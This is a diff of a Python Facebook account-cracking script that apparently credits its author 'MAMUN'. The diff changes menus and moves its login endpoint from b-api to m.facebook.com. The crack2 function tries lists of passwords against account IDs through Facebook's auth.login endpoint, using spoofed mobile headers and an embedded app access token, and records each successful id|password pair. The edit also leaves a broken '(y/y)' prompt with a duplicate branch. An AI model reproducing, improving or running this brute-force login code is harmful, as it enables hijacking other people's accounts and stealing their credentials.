@@ -89,22 +89,21 @@ def banner():
    /  |/  /   |  /  |/  / / / / | / /    | |/ /
   / /|_/ / /| | / /|_/ / / / /  |/ /_____|   / 
  / /  / / ___ |/ /  / / /_/ / /|  /_____/   |  
-/_/  /_/_/  |_/_/  /_/\____/_/ |_/     /_/|_|  
-                                                                                                                                                                 
-\x1b[92;1m===================================>\x1b[92;1m
+/_/  /_/_/  |_/_/  /_/\____/_/ |_/     /_/|_|                                                                                                                                                                   
+\x1b[92;1m===================================\x1b[92;1m
 \x1b[93;1m Author       \x1b[92;1m:      \x1b[93;1mM A M U N
 \x1b[93;1m Whatsapp     \x1b[92;1m:      \x1b[93;1m+8801304906886
 \x1b[93;1m Facebook     \x1b[92;1m:      \x1b[93;1mﾞMood　一　Offﾞ　Stay ﾞxﾞ Alert十
-\x1b[92;1m===================================>\x1b[92;1m
+\x1b[92;1m===================================\x1b[92;1m
 """%(h))
 		
 def menu(): #Bilo
 	banner()
 	print("") #Bilo
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print("""%s \x1b[92;1m===================================\x1b[92;1m """%(h))
 	print("""%s \33[1;33m[1] Start Crack  """%(h))
 	print("""%s \33[1;33m[0] Exit"""%(h))
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print("""%s \x1b[92;1m===================================\x1b[92;1m """%(h))
 	farhan = input(x+'\33[1;96m•Input Number> ')
 	if farhan in ['1','01']:
 		File2()
@@ -127,10 +126,10 @@ def File2():
 				exit("\n [!] file %s not found"%(fileX))
 
 def setting():
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print("""%s \x1b[92;1m===================================\x1b[92;1m """%(h))
 	print("""%s \33[1;33m[01] Method 1 """%(h))
 	print("""%s \33[1;33m[02] Method 2 """%(h))
-	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print("""%s \x1b[92;1m===================================\x1b[92;1m """%(h))
 	mubashar = input(x+'\33[1;96m•Input Number>')
 	if mubashar in ['1','01']:
 		for bacot in id:
@@ -143,18 +142,18 @@ def setting():
 		print("""%s \33[1;33mRoung Input"""%(h))
 		exit()
 	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	print("""%s \33[1;33m[01] B-Api (fast)"""%(h))
-	print("""%s \x1b[92;1m<===================================>\x1b[92;1m """%(h))
+	print("""%s \33[1;33m[01] Mobile (best)"""%(h))
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
 	baloch = input(x+'\33[1;96m•Input Number> : ')
 	if baloch in ['1','01']:
-		method.append('api')
+		method.append('mobile')
 	else:
-		method.append('api')
+		method.append('mobile')
 	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
-	fast = input(x+'\33[1;96m Want To Start ? (y/t) : ')
+	fast = input(x+'\33[1;96m Want To Start ? (y/y) : ')
 	if fast in ['y','Y']:
 		passwrd()
-	elif fast in ['t','T']:
+	elif fast in ['y','Y']:
 		os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
 		exit()
 
@@ -203,7 +202,7 @@ def crack2(idf,pwv):
 	for pw in pwv:
 		try:
 			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
+			resp = ses.get("https://m.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_m_req_friendly_name=authenticate&cpl=true", headers=head)
 			if "www.facebook.com" in resp.json()["error_msg"]:
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
